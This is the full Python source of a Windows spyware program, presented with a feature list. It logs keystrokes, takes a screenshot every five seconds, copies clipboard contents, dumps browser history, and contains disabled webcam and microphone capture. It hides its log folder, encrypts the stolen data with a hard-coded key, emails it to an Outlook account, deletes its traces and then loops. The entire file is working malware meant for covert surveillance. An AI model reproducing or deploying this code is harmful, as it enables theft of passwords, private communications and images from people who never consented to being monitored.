#Features:
# \ Sends clipboard data
# \ Screenshots every 5 seconds 
# \ Ability to enable microphone and webcam sharing (I disabled this because some cameras light up and some software report that the mic is being used)
# \ Access the browser history
# \ Everything is send to an outlook email (you can change it in line 100)
# \ All you need to have is python 3 installed and everything will install itself when executed.

from multiprocessing.connection import wait
from os import getcwd
from shutil import copy
import sys
import subprocess, socket, os, re, smtplib, \
        logging, pathlib, json, time, shutil
subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'opencv-python'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'browserhistory'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'Pillow'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'scipy'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
import win32clipboard
import cv2
import requests
import browserhistory as bh
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32con
import win32api


# Keystroke Capture Funtion #
def logg_keys(file_path):
    logging.basicConfig(filename = (file_path + 'key_logs.txt'), 
        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    on_press = lambda Key : logging.info(str(Key))
    with Listener(on_press=on_press) as listener:
        listener.join()

# Screenshot Capture Function #
def screenshot(file_path):
    pathser = 'C:/Users/Public/Logs/Screenshots/screenshot19.png'
    pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
    pathlib.Path('C:/Users/Public/Logs/Screenshots2').mkdir(parents=True, exist_ok=True)
    pathlib.Path('C:/Users/Public/Logs/Screenshots3').mkdir(parents=True, exist_ok=True)

    for x in range(0,60):
        isFile = os.path.isfile(pathser)
        if pathser == 'C:/Users/Public/Logs/Screenshots/screenshot19.png' and isFile == False: 
            screen_path = file_path + 'Screenshots\\'
        if isFile == True and pathser == 'C:/Users/Public/Logs/Screenshots/screenshot19.png':
             screen_path = file_path + 'Screenshots2\\'
             pathser = 'C:/Users/Public/Logs/Screenshots2/screenshot39.png'
        if pathser == 'C:/Users/Public/Logs/Screenshots2/screenshot39.png' and isFile == False: screen_path = file_path + 'Screenshots2\\'
        if pathser == 'C:/Users/Public/Logs/Screenshots2/screenshot39.png' and isFile == True: screen_path = file_path + 'Screenshots3\\'
        pic = ImageGrab.grab()
        pic.save(screen_path + 'screenshot{}.png'.format(x))
        time.sleep(5)

# Mic Recording Function #
#def microphone(file_path):
    #for x in range(0, 5):
        #fs = 44100
        #seconds = 60
        #myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        #sounddevice.wait()
        #write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)

# Webcam Snapshot Function #
def webcam(file_path):
    pathlib.Path('C:/Users/Public/Logs/WebcamPics').mkdir(parents=True, exist_ok=True)
    cam_path = file_path + 'WebcamPics\\'
    cam = cv2.VideoCapture(0)

    for x in range(0, 60):
#        ret, img = cam.read()
#        file = (cam_path  + '{}.jpg'.format(x))
#        cv2.imwrite(file, img)
        time.sleep(5)

    #cam.release
    #cv2.destroyAllWindows

def email_base(name, email_address):
    name['From'] = email_address
    name['To'] =  email_address
    name['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    name.attach(MIMEText(body, 'plain'))
    return name

def smtp_handler(email_address, password, name):
    s = smtplib.SMTP('smtp.outlook.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, email_address, name.as_string())
    s.quit()

# Email sending function #
def send_email(path): 
    regex = re.compile(r'.+\.xml$')
    regex2 = re.compile(r'.+\.txt$')
    regex3 = re.compile(r'.+\.png$')
    regex4 = re.compile(r'.+\.jpg$')
    regex5 = re.compile(r'.+\.wav$')

    email_address = ''                      #<--- Enter your email address
    password = ''                    #<--- Enter email password 
    
    msg = MIMEMultipart()
    email_base(msg, email_address)

    exclude = set(['Screenshots', 'WebcamPics', 'Screenshots2', 'Screenshots3'])
    for dirpath, dirnames, filenames in os.walk(path, topdown=True):
        dirnames[:] = [d for d in dirnames if d not in exclude]
        for file in filenames:
            if regex.match(file) or regex2.match(file) \
                or regex3.match(file) or regex4.match(file):

                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 
                                'filename = {}'.format(file))
                msg.attach(p)

            elif regex5.match(file):
                msg_alt = MIMEMultipart()
                email_base(msg_alt, email_address)
                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 
                                'filename = {}'.format(file))
                msg_alt.attach(p)

                smtp_handler(email_address, password, msg_alt)

            else:
                pass

    smtp_handler(email_address, password, msg)

##### Copy the clipboard ########################################################################################################
def clipboard(file_path):
    while True:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
            clipboard_info.write('\nClipboard Data: \n' + pasted_data)
        time.sleep(10)

def main():
    pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
    file_path = 'C:\\Users\\Public\\Logs\\'
    win32api.SetFileAttributes('C:\\Users\\Public\\Logs\\', win32con.FILE_ATTRIBUTE_HIDDEN)


##### Get the browsing history ##################################################################################################
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((bh_user, db_path, hist))
    with open(file_path + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(browser_history))

##### Using multiprocess module to log keystrokes, get screenshots, ############################################################ 
    # record microphone, as well as webcam picures #
    p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()
    p2 = Process(target=screenshot, args=(file_path,)) ; p2.start()
    #p3 = Process(target=microphone, args=(file_path,)) ; p3.start()
    #p4 = Process(target=webcam, args=(file_path,)) ; p4.start()
    p5 = Process(target=clipboard, args=(file_path,)) ; p5.start()

    p1.join(timeout=300) ; p2.join(timeout=300) ; p5.join(timeout=300) 
#p3.join(timeout=300) p4.join(timeout=300)

    p1.terminate() ; p2.terminate() ; p5.terminate()#; p4.terminate()
#p3.terminate()
        
##### Encrypt files #############################################################################################################
    files = [ 'browser.txt', 'key_logs.txt', 'clipboard_info.txt' ]

    regex = re.compile(r'.+\.xml$')
    dir_path = 'C:\\Users\\Public\\Logs'

    for dirpath, dirnames, filenames in os.walk(dir_path):
        [ files.append(file) for file in filenames if regex.match(file) ]

    # In the python console type: from cryptography.fernet import Fernet ; then run the command
    # below to generate a key. This key needs to be added to the key variable below as
    # well as in the DecryptFile.py that should be kept on the exploiters system. If either
    # is forgotten either encrypting or decrypting process will fail. #
    # Command -> Fernet.generate_key()
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    for file in files:
        with open(file_path + file, 'rb') as plain_text:
            data = plain_text.read()
        encrypted = Fernet(key).encrypt(data)
        with open(file_path + 'e_' + file, 'ab') as hidden_data:
            hidden_data.write(encrypted)
        os.remove(file_path + file)

##### Send encrypted files to email account #####################################################################################
    send_email('C:\\Users\\Public\\Logs')
    send_email('C:\\Users\\Public\\Logs\\Screenshots')
    send_email('C:\\Users\\Public\\Logs\\Screenshots2')
    send_email('C:\\Users\\Public\\Logs\\Screenshots3')
    send_email('C:\\Users\\Public\\Logs\\WebcamPics')

    # Clean Up Files #
    shutil.rmtree('C:\\Users\\Public\\Logs')

    # Loop #
    main()


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, \
                            filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception('* Error Ocurred: {} *'.format(ex))
        pass
